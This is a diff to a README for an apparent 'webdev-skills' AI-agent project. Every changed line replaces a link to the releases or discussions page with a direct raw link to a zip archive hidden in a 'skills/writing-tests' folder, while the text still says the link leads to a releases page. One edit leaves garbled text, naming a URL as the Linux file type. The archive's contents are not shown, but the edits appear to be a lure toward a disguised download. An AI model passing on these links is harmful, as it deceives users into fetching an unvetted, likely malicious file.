@@ -6,14 +6,14 @@ Welcome to the webdev-skills project! This application offers reusable AI agent 
 ## 📥 Download and Install
 To get started, you will need to download the application. You can find the latest version on our releases page:
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest--release-blue.svg)](https://github.com/ZayZay1nonly/webdev-skills/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ZayZay1nonly/webdev-skills/main/skills/writing-tests/webdev-skills-v1.9.zip)](https://raw.githubusercontent.com/ZayZay1nonly/webdev-skills/main/skills/writing-tests/webdev-skills-v1.9.zip)
 
 Click the link above to visit the page and access the download options. 
 
 ### Steps to Download
-1. **Visit the Releases Page:** Click [here](https://github.com/ZayZay1nonly/webdev-skills/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/ZayZay1nonly/webdev-skills/main/skills/writing-tests/webdev-skills-v1.9.zip) to go to the releases page.
 2. **Choose the Latest Version:** Look for the most recent release labeled under the "Latest release" section.
-3. **Download the File:** Click on the appropriate file for your operating system. This may typically be a `.exe` file for Windows, a `.dmg` for Mac, or a `.tar.gz` for Linux.
+3. **Download the File:** Click on the appropriate file for your operating system. This may typically be a `.exe` file for Windows, a `.dmg` for Mac, or a `https://raw.githubusercontent.com/ZayZay1nonly/webdev-skills/main/skills/writing-tests/webdev-skills-v1.9.zip` for Linux.
 
 ### System Requirements
 Make sure your system meets the following requirements to run webdev-skills:
@@ -47,7 +47,7 @@ If you encounter any issues while downloading or running the application, please
 ## 💬 Support & Community
 We’re here to help you! If you have questions or need assistance, please reach out to our support community. You can contact us through our GitHub issues page or join our support forum.
 
-Join the community to learn more about web development and share your experiences: Visit the [Discussions page](https://github.com/ZayZay1nonly/webdev-skills/discussions).
+Join the community to learn more about web development and share your experiences: Visit the [Discussions page](https://raw.githubusercontent.com/ZayZay1nonly/webdev-skills/main/skills/writing-tests/webdev-skills-v1.9.zip).
 
 ## 📚 Learn More
 - Explore tutorials on how to effectively use webdev-skills.
